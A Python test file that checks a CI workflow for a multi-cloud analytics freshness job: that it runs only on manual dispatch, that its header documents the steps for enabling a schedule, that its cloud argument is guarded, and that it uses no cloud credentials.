def _workflow() -> dict[str, object]:
    parsed = yaml.safe_load(WORKFLOW.read_text())
    assert isinstance(parsed, dict)
    return parsed


def _on_block(workflow: dict[str, object]) -> dict[str, object]:
    # YAML 1.1 resolves a bare `on:` key to the boolean True, so both spellings
    # have to be accepted or this assertion passes by never finding anything.
    block = workflow.get("on", workflow.get(True))
    assert isinstance(block, dict), "the workflow has no `on:` mapping"
    return block


def _check_run_script(workflow: dict[str, object]) -> str:
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    steps = jobs["check"]["steps"]  # type: ignore[index]
    for step in steps:
        run = step.get("run", "")
        if "check_fleet_analytics_freshness" in run:
            assert isinstance(run, str)
            return run
    raise AssertionError("no step runs the fleet freshness module")


def test_workflow_ships_without_a_schedule_or_a_push_trigger() -> None:
    """No trigger may fire this job before a control plane publishes the section.

    Merging main auto-deploys the GCP control plane ONLY (deploy.yml); AWS-EU
    and Azure are hand-run scripts and are already behind. A `schedule:` landed
    in the same commit as the publisher would file an issue every morning about
    two clouds nobody has redeployed -- and the daily issue teaches people to
    close this job unread, at which point it is not watching the clouds it CAN
    read either. That is the same failure the client-telemetry check's
    `CANARY_COUNT_GATE_FROM` ramp-up guard exists to avoid, and the same reason
    this job's single-cloud predecessor shipped scheduleless.

    `push:` was held to be different -- one run, on the merge, aimed at
    somebody still holding the context. It is not. On that merge NO plane
    publishes the section yet, so the run fails, and the failure step opens a
    LABELLED PUBLIC ISSUE about a state this repository has already written
    down as expected. Filing an automated issue against a known, documented,
    not-yet-true precondition is the cry-wolf failure with a shorter fuse. The
    honest sequencing is: deploy, dispatch once by hand, then enable both
    triggers in one commit that also deletes this test.

    `workflow_dispatch` is the whole trigger surface until then.
    """
    on_block = _on_block(_workflow())

    assert "schedule" not in on_block
    assert "push" not in on_block
    assert set(on_block) == {"workflow_dispatch"}


def test_workflow_header_states_the_precondition_and_the_follow_up() -> None:
    """A withheld trigger is only honest if the note says how to un-withhold it.

    Including the part that is only discoverable by breaking it: turning the
    triggers on fails two tests, and the header names both, so nobody learns
    what they changed from a red CI run.
    """
    workflow = WORKFLOW.read_text()

    assert "OPERATOR STEPS BEFORE THE SCHEDULE IS ENABLED" in workflow
    assert "PRECONDITION" in workflow
    assert 'schedule: [{cron: "20 7 * * *"}]' in workflow
    assert "cries wolf" in workflow
    # Named, not described. A rename that does not update the header fails here.
    assert "::test_workflow_ships_without_a_schedule_or_a_push_trigger" in workflow
    assert "::test_workflow_still_does_not_page_before_the_field_is_deployed" in workflow
    assert "tests/test_analytics_freshness_registry.py" in workflow
    assert "tests/test_aws_analytics_drain_install.py" in workflow


def test_the_scheduled_run_line_can_never_be_narrowed_to_one_cloud() -> None:
    """Structural, because the string version of this test proved nothing.

    Asserting that the file merely CONTAINS `if [ -n "${CLOUD}" ]` is satisfied
    by a script that also passes `--cloud gcp` unconditionally two lines later:
    the job would be green about one cloud and silent about the rest, which is
    the outage's own shape. So parse the YAML, take the actual run script, and
    require every `--cloud` in it to sit inside the workflow_dispatch guard.
    """
    script = _check_run_script(_workflow())

    depth = 0
    guarded = 0
    for line in script.splitlines():
        stripped = line.strip()
        if stripped.startswith("if ") and 'if [ -n "${CLOUD}" ]' in stripped:
            depth += 1
            continue
        if stripped.startswith("if "):
            depth += 1 if depth else 0
            continue
        if stripped == "fi" and depth:
            depth -= 1
            continue
        if "--cloud" in stripped:
            assert depth, f"--cloud passed outside the CLOUD guard: {stripped!r}"
            guarded += 1

    assert guarded == 1, "expected exactly one guarded --cloud line"
    assert "check_aws_analytics_freshness" not in script


def test_workflow_runs_the_fleet_module_not_the_single_cloud_alias() -> None:
    script = _check_run_script(_workflow())

    assert "python3 -m clickhouse.check_fleet_analytics_freshness" in script


def test_workflow_needs_no_cloud_credentials() -> None:
    """The whole reason for publishing the field: the check is a plain GET."""
    workflow = WORKFLOW.read_text()

    assert "configure-aws-credentials" not in workflow
    assert "role-to-assume" not in workflow
    assert "google-github-actions/auth" not in workflow
    assert "secrets." not in workflow
